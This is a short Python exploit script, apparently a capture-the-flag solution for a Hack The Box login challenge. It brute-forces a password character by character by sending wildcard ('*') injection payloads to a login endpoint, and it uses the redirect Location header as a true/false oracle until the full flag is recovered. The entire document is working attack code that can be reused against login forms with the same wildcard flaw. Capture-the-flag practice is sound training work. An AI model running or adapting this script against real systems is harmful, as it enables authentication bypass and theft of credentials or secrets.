import requests

def req(username, flag):
    return requests.post(   url=url,  
                            data={'username':'reese', 'password':flag}, 
                            allow_redirects=False).headers['Location']
def main():
    username    = "reese"
    flag        = "HTB"
    chars       = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
    i           = 0
    while(flag[-1:]!='}'):
        i = 0
        for i in range(len(chars)):
            location=req(username,flag+chars[i]+'*')
            if(location=="/"):
                flag=flag+chars[i]
            i = i+1
            print(f'Wait! Flag so far: {flag}',end='\r')
    print(f'\n\nfinal flag: {flag}')

if __name__ == "__main__":
    url     = 'http://206.189.24.232:32237/login'
    main()
